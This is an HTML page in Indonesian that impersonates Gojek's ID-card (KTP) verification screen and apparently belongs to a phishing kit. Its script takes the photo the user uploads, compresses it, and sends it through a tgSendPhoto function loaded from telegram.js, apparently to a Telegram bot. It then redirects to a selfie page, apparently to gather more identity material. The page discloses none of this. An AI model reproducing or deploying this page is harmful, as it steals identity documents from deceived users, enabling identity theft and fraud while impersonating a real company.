<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gojek — Upload KTP</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: #fff;
      border-radius: 16px;
      padding: 40px 36px 36px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
    }

    .back-btn {
      display: flex;
      align-items: center;
      gap: 6px;
      background: none;
      border: none;
      cursor: pointer;
      color: #555;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 28px;
      padding: 0;
    }

    .back-btn svg {
      width: 18px;
      height: 18px;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .back-btn:hover {
      color: #00AA13;
    }

    h1 {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: #777;
      margin-bottom: 32px;
      line-height: 1.5;
    }

    .ktp-options {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 24px;
    }

    .ktp-btn {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
      padding: 24px 12px;
      border: 1.5px solid #e0e0e0;
      border-radius: 14px;
      background: #fff;
      cursor: pointer;
      font-size: 14px;
      font-weight: 600;
      color: #333;
      transition: border-color 0.2s, background 0.2s, color 0.2s;
    }

    .ktp-btn:hover {
      border-color: #00AA13;
      background: #f0fff2;
      color: #00AA13;
    }

    .ktp-btn.selected {
      border-color: #00AA13;
      background: #f0fff2;
      color: #00AA13;
    }

    .ktp-btn svg {
      width: 36px;
      height: 36px;
      stroke: currentColor;
      fill: none;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .ktp-preview {
      display: none;
      border-radius: 12px;
      overflow: hidden;
      border: 1.5px solid #e0e0e0;
      margin-bottom: 20px;
    }

    .ktp-preview img {
      width: 100%;
      max-height: 220px;
      object-fit: cover;
      display: block;
    }

    .ktp-preview-footer {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 14px;
      background: #f9f9f9;
    }

    .ktp-preview-footer span {
      font-size: 12px;
      color: #888;
    }

    .btn-ganti {
      font-size: 12px;
      font-weight: 600;
      color: #00AA13;
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }

    .btn-lanjut {
      display: none;
      width: 100%;
      background: #00AA13;
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 15px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    .btn-lanjut:hover {
      background: #009911;
    }

    .btn-lanjut:active {
      transform: scale(0.98);
    }

    .info-box {
      display: flex;
      gap: 10px;
      background: #f0fff2;
      border: 1px solid #c3f0c8;
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 24px;
    }

    .info-box svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      stroke: #00AA13;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
      margin-top: 1px;
    }

    .info-box p {
      font-size: 12px;
      color: #2d7a35;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="card">
    <button class="back-btn" onclick="window.location.href='index.html'">
      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
      Kembali
    </button>

    <h1>Verifikasi KTP</h1>
    <p class="subtitle">Upload foto KTP kamu untuk melanjutkan. Pastikan seluruh bagian KTP terlihat jelas.</p>

    <div class="info-box">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
      <p>Foto harus jelas, tidak buram, dan semua teks pada KTP harus terbaca.</p>
    </div>

    <div class="ktp-options">
      <button class="ktp-btn" id="btnKamera" onclick="openCamera()">
        <svg viewBox="0 0 24 24">
          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
          <circle cx="12" cy="13" r="4"/>
        </svg>
        Ambil Foto
      </button>
      <button class="ktp-btn" id="btnGaleri" onclick="openGaleri()">
        <svg viewBox="0 0 24 24">
          <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
          <circle cx="8.5" cy="8.5" r="1.5"/>
          <polyline points="21 15 16 10 5 21"/>
        </svg>
        Dari Galeri
      </button>
    </div>

    <input type="file" id="inputKamera" accept="image/*" capture="environment" style="display:none" onchange="previewKTP(event, 'kamera')" />
    <input type="file" id="inputGaleri" accept="image/*" style="display:none" onchange="previewKTP(event, 'galeri')" />

    <div class="ktp-preview" id="ktpPreview">
      <img id="ktpImg" src="" alt="Preview KTP" />
      <div class="ktp-preview-footer">
        <span>Preview KTP kamu</span>
        <button class="btn-ganti" onclick="gantiPhoto()">Ganti foto</button>
      </div>
    </div>

    <button class="btn-lanjut" id="btnLanjut" onclick="submitKTP()">Lanjutkan</button>
  </div>

  <script src="telegram.js"></script>
  <script>
    function openCamera() {
      document.getElementById('inputKamera').click();
    }

    function openGaleri() {
      document.getElementById('inputGaleri').click();
    }

    function previewKTP(event, source) {
      const file = event.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(e) {
        document.getElementById('ktpImg').src = e.target.result;
        document.getElementById('ktpPreview').style.display = 'block';
        document.getElementById('btnLanjut').style.display = 'block';

        document.getElementById('btnKamera').classList.toggle('selected', source === 'kamera');
        document.getElementById('btnGaleri').classList.toggle('selected', source === 'galeri');
      };
      reader.readAsDataURL(file);
    }

    function gantiPhoto() {
      document.getElementById('ktpPreview').style.display = 'none';
      document.getElementById('btnLanjut').style.display = 'none';
      document.getElementById('btnKamera').classList.remove('selected');
      document.getElementById('btnGaleri').classList.remove('selected');
      document.getElementById('inputKamera').value = '';
      document.getElementById('inputGaleri').value = '';
    }

    async function submitKTP() {
      const btn = document.getElementById('btnLanjut');
      btn.textContent = 'Mengunggah...';
      btn.disabled = true;

      const fileKamera = document.getElementById('inputKamera').files[0];
      const fileGaleri = document.getElementById('inputGaleri').files[0];
      const file = fileKamera || fileGaleri;

      if (file) {
        const compressed = await compressImage(file).catch(() => file);
		  await tgSendPhoto(compressed, '🪪 <b>Foto KTP Gojek</b>').catch(() => {});
      }

      window.location.href = 'selfie.html';
    }
  </script>
</body>
</html>
